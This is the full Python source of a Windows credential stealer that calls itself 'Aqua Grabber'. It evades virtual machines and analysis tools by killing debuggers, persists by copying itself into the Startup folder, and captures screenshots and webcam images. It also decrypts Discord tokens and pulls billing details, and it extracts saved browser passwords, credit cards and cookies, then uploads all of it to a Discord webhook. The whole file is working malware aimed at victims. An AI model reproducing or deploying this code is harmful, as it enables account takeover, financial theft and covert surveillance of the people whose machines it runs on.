import base64
import json
import shutil
import glob
import sqlite3
import subprocess
import sys
import zipfile
from datetime import datetime, timedelta
from random import randint

import cv2
import requests
import win32com.client
import os
import re
from json import loads
from requests import post

import win32crypt

from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss
from Cryptodome.Cipher import AES
from Crypto.Cipher import AES
from urllib3 import PoolManager

user = os.environ.get("USERNAME")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
Aqua = "C:/Users/Public/Aqua"


def get_HWID():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
        print("Created Aqua")
    else:
        shutil.rmtree("C:/Users/Public/Aqua")
        print("Deleted Aqua")
        os.mkdir("C:/Users/Public/Aqua")
        print("Created Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")
        print("Created ss")
    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
        os.mkdir("C:/Users/Public/Aqua/Cam")
        print("Created cam")
    if not os.path.exists('C:/Users/Public/Aqua/Info'):
        os.mkdir("C:/Users/Public/Aqua/Info")
        print("Created Info")
    if not os.path.exists('C:/Users/Public/Aqua/Arc'):
        os.mkdir("C:/Users/Public/Aqua/Arc")
        print("Created Arc")


def takeSS():
    for i in range(50):
        with mss() as sct:
            sct.shot(mon=-1, output=f"{Aqua}/ss/{i}.png")

    frame_folder = f'{Aqua}/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"{Aqua}/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=100, loop=1)

    make_gif()
    with open(f'{Aqua}/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done Taking ScreenShots")
    webhook.execute()
    webhook.remove_files()


def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(1):
                    return_value, image = camera.read()
                    cv2.imwrite(f'{Aqua}/Cam/{str(x)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera
                print(f"Done Grabbing Webcam Numb {x}")
            except:
                webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
                print(f"Failed Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
        try:
            for a in range(test):
                with open(f"{Aqua}/Cam/{a}.png", "rb") as file:
                    data = file.read()
                webhook.add_file(data, f"Aqua_{user}_Webcam{a}.png")
            webhook.content = f'```{user} | Webcams | HWID: {get_HWID()}```'
            webhook.execute()
            webhook.remove_files()
            print("Done Sending Webcams")
        except:
            print("Some Error In Webcam")
    except:
        webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
        print(f"Unknown Error")
        webhook.execute()
        webhook.remove_files()


def getDcToken():
    tokenPaths = {
        'Discord': f"{roaming}\\Discord",
        'Discord Canary': f"{roaming}\\discordcanary",
        'Discord PTB': f"{roaming}\\discordptb",
        'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
        'Opera': f"{roaming}\\Opera Software\\Opera Stable",
        'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
        'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
    }
    fileInfo = f"tokens_" + os.getlogin() + ".txt"

    def checkToken(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
        if "You need to verify your account in order to perform this action." in str(
                response.content) or "401: Unauthorized" in str(response.content):
            return False
        else:
            return True

    def variant2_Status(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
        if response.status_code == 401:
            return False
        elif "You need to verify your account in order to perform this action." in str(response.content):
            return True
        else:
            return True

    def decrypt_token(buff, master_key):
        try:
            return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                           buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            pass

    def getUserData(token):
        TokenUser = requests.get(
            'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get(
            'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get(
            'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        gift_codes = requests.get(
            'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
            headers={'Authorization': token}).json()

        def HasBilling():
            if str(billing) == "[]":
                return f"\n💳 Billing : :x:\n\n"
            else:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')
                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")
                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)
                return f"\n💳 Billing : ```{payment_methods}```"

        def getGuilds():
            NumberOfServer = 0
            for guild in guilds:
                if guild['permissions'] == '562949953421311':
                    print("Admin In Server: " + guild['name'])
                    with open(f"{Aqua}/Info/guilds.txt", "a") as f:
                        f.write(str(guild['name'] + "\n"))
                else:
                    admin = False
                NumberOfServer = NumberOfServer + 1
            return f"\n:floppy_disk: Victim Is In `{NumberOfServer}` Discord Guilds"

        def HasGifts():
            if str(gift_codes) == "[]":
                return f"\n<a:gift:1021608479808569435> Gift Codes : :x:\n\n"
            else:
                return f"\n<a:gift:1021608479808569435> Gift Codes : ```{gift_codes}```"

        username = TokenUser['username'] + '#' + TokenUser['discriminator']
        user_id = TokenUser['id']
        email = TokenUser['email']
        phone = TokenUser['phone']
        mfa = TokenUser['mfa_enabled']
        nitro = bool(TokenUser.get("premium_type"))
        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif" if requests.get(
            f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.png"
        webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
        webhook.add_embed(embed)
        embed.set_title(
            f"<a:Lightblue_Verification:1018036944946602025> Username : `{username}` <a:Lightblue_Verification:1018036944946602025>")
        embed.set_image(avatar)
        embed.set_description(
            f"\n<a:right_arrow:988374691720888340> Token : ```{token}```\n✉️ Email :\n══ `{email}`\n\n📱 Phone :\n══ `{phone}`\n\n<a:boost:988374649253552158> Nitro :\n══ `{nitro}`\n\n<:mfa:1021604916537602088> 2FA :\n══ `{mfa}`")
        embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
        webhook.execute()
        webhook.remove_files()
        webhook.remove_embeds()
        print(f"Extracted Details From {token}")

    def get_tokens(path):
        cleaned = []
        tokens = []
        done = []
        lev_db = f"{path}\\Local Storage\\leveldb\\"
        loc_state = f"{path}\\Local State"
        # new method with encryption
        if os.path.exists(loc_state):
            with open(loc_state, "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
            for file in os.listdir(lev_db):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(lev_db + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError:
                        continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                done += [decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])]

        else:  # old method without encryption
            for file_name in os.listdir(path):
                try:
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                done.append(token)
                except:
                    continue

        return done

    def main_tokens():
        for platform, path in tokenPaths.items():
            if not os.path.exists(path):
                continue
            try:
                tokens = set(get_tokens(path))
            except:
                continue
            if not tokens:
                continue
            with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
                for i in tokens:
                    f.write(str(i) + "\n")
                    print(f"{i} [1: {checkToken(i)}] [2: {variant2_Status(i)}]")
                    if checkToken(i) & variant2_Status(i):
                        try:
                            getUserData(i)
                        except:
                            print("Token Invalid")

    main_tokens()


# Kill Task

def TaskKill(*tasks: str) -> bool:  # Tries to kill given processes
    tasks = list(map(lambda x: x.lower(), tasks))
    out = (subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(
        errors='ignore')).strip().split('\r\n\r\n')
    for i in out:
        i = i.split("\r\n")[:2]
        try:
            name, pid = i[0].split()[-1], int(i[1].split()[-1])
            name = name[:-4] if name.endswith(".exe") else name
            if name.lower() in tasks:
                subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
                return True
        except Exception:
            return False
            pass


# AntiVm


def AntiVm():
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009',
                         '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
                         '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548',
                         '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972',
                         '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
                         '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022',
                         '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65',
                         'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
                         'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C',
                         '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363',
                         '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
                         '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
                         '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB',
                         '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
                         'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250',
                         '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
                         '9961A120-E691-4FFE-B67B-F0E4115D5919', '94C508AC-39CC-11E4-AA3A-8A13E4E42000')
    BLACKLISTED_COMPUTERNAMES = (
        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh',
        'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6',
        'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs',
        'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh',
        'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = (
        'wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank',
        '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss',
        '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = (
        'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray',
        'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc',
        'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient',
        'ksdumper',
        'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    def checkUUID():
        uuid = subprocess.run("wmic csproduct get uuid", shell=True, capture_output=True).stdout.splitlines()[2].decode(
            errors='ignore').strip()
        return uuid in BLACKLISTED_UUIDS

    def checkComputerName() -> bool:  # Checks if the computer name of the user is blacklisted or not
        computerName = os.getenv("computerName")
        return computerName.lower() in BLACKLISTED_COMPUTERNAMES

    def checkUsers() -> bool:  # Checks if the username of the user is blacklisted or not
        userN = os.getlogin()
        return userN.lower() in BLACKLISTED_USERS

    def checkHosting() -> bool:  # Checks if the user's system in running on a server or not
        http = PoolManager(cert_reqs="CERT_NONE")
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(
                errors="ignore").strip() == 'true'
        except Exception:
            print("Not Ale To Check Hosting")
            return False

    def checkRegistry() -> bool:  # Checks if user's registry contains any data which indicates that it is a VM or not
        print("Checking Registry")
        r1 = subprocess.run(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2",
            capture_output=True, shell=True)
        r2 = subprocess.run(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2",
            capture_output=True, shell=True)
        gpuCheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output=True,
                                                   shell=True).stdout.decode(errors="ignore").splitlines()[
            2].strip().lower() for x in ("virtualbox", "vmware"))
        dirCheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return (r1.returncode != 1 and r2.returncode != 1) or gpuCheck or dirCheck

    def killTasks() -> bool:  # Kills blacklisted processes
        if TaskKill(*BLACKLISTED_TASKS):
            return False
        else:
            return True

    def checkVm():
        IsVm = False
        if checkUUID():
            IsVm = True
            print("Failed UUID Check")
        elif checkComputerName():
            IsVm = True
            print("Failed Pc Name Check")
        elif checkUsers():
            IsVm = True
            print("Failed Username Check")
        elif checkHosting():
            IsVm = True
            print("Failed Hosting Check")
        elif checkRegistry():
            IsVm = True
            print("Failed Registry Check")
        else:
            IsVm = False
            print("Passed All Checks")
        if killTasks():
            print("Killed Blacklisted Processes")
        else:
            print("Failed To Kill Tasks")
        return IsVm

    if checkVm():
        exit(0)
    else:
        print("Continuing After CheckVm")


# Get Self


def GetSelf() -> tuple[str, bool]:  # Returns the location of the file and whether exe mode is enabled or not
    if hasattr(sys, "frozen"):
        return sys.executable, True
    else:
        return __file__, False


# Copy To StartUp


def copy_to_startup() -> None:
    try:
        startup_path: str = os.path.join(os.getenv("APPDATA"), r"Microsoft/Windows/Start Menu/Programs/Startup")
        dest_path: str = os.path.join(startup_path, "system.exe")
        if not os.path.exists(dest_path):
            try:
                shutil.copyfile(GetSelf()[0], dest_path)
                print("Copyed To Startup")
                webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
                webhook.add_embed(embed)
                embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
                embed.set_description(
                    f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
                webhook.execute()
                webhook.remove_embeds()
                webhook.remove_files()
            except:
                webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
                webhook.add_embed(embed)
                embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
                embed.set_description(
                    f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
                webhook.execute()
                webhook.remove_embeds()
                webhook.remove_files()
        else:
            webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
            webhook.add_embed(embed)
            embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
            embed.set_description(
                f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
            webhook.execute()
            webhook.remove_embeds()
            webhook.remove_files()
    except:
        webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
        webhook.add_embed(embed)
        embed.set_title("<:PepeHands:1017972631565250600> StartUp Info <:PepeHands:1017972631565250600>")
        embed.set_description(
            f"| Status : <a:CatNo:1135259345383342091> |\n| Reason : Unknown |")
        webhook.execute()
        webhook.remove_embeds()
        webhook.remove_files()


def zipFolder(folder):
    try:
        zf = zipfile.ZipFile(f"{folder}.zip", "w")
        for dirname, subdirs, files in os.walk(folder):
            zf.write(dirname)
            for filename in files:
                zf.write(os.path.join(dirname, filename))
        zf.close()
        print("Zipped Folder: " + folder)
    except:
        print("Failed To Zip")


def getBrowsers():
    try:
        appdata = os.getenv('LOCALAPPDATA')

        browsers = {
            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

        data_queries = {
            'login_data': {
                'query': 'SELECT action_url, username_value, password_value FROM logins',
                'file': '\\Login Data',
                'columns': ['URL', 'Email', 'Password'],
                'decrypt': True
            },
            'credit_cards': {
                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                'file': '\\Web Data',
                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                'decrypt': True
            },
            'cookies': {
                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
                'file': '\\Network\\Cookies',
                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
                'decrypt': True
            },
            'history': {
                'query': 'SELECT url, title, last_visit_time FROM urls',
                'file': '\\History',
                'columns': ['URL', 'Title', 'Visited Time'],
                'decrypt': False
            },
            'downloads': {
                'query': 'SELECT tab_url, target_path FROM downloads',
                'file': '\\History',
                'columns': ['Download URL', 'Local Path'],
                'decrypt': False
            }
        }

        def get_master_key(path: str):
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return key

        def decrypt_password(buff: bytes, key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def save_results(browser_name, type_of_data, content):
            if not os.path.exists(f'{Aqua}/Arc/{browser_name}'):
                os.mkdir(f'{Aqua}/Arc/{browser_name}')
            if content is not None:
                open(f'{Aqua}/Arc/{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
            else:
                print(f"\t [-] No Data Found!")

        def get_data(path: str, profile: str, key, type_of_data):
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return
            result = ""
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result

        def convert_chrome_time(chrome_time):
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

        def installed_browsers():
            available = []
            for x in browsers.keys():
                if os.path.exists(browsers[x]):
                    available.append(x)
            return available

        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)

            for data_type_name, data_type in data_queries.items():
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)
        # Send Webhook
        print("Done Browser Stealin")
        zipFolder(f"{Aqua}/Arc")
        webhook.content = f'```{user} | Browser Infos | HWID: {get_HWID()}```'
        with open(f"{Aqua}/Arc.zip", "rb") as file:
            data = file.read()
        webhook.add_file(data, f"Aqua_{user}_Browsers.zip")
        webhook.execute()
        webhook.remove_embeds()
        webhook.remove_files()
    except:
        # Send Error
        pass


# Clean Up


def cleanUp():
    shutil.rmtree(Aqua)
    print("Cleaned Up")


webhook_url = 'Webhook Here'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"
webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252/1181320259333005373/de750a3b084de1802279c1f42ab0fc33.png?ex=6580a139&is=656e2c39&hm=647afff7f3e0e7e3a7f912ce7da5d30e3599ae61695e0dea54333bbba8d5db02&"


def runAqua():
    AntiVm()
    makeDir()
    takeSS()
    copy_to_startup()
    getCam()
    getDcToken()
    getBrowsers()
    cleanUp()


runAqua()
